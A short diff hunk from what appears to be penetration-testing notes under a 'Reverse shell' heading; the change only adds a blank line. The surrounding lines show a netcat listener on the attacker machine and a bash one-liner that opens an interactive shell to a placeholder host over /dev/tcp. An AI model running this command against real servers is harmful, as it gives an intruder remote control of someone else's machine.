@@ -104,6 +104,7 @@ Reverse shell
 
 on attacker machine
 `nc -nvlp 4444`
+
 on webserver’s command line
 `bash -c 'exec bash -i &>/dev/tcp/{IP}/4444 <&1'`
 
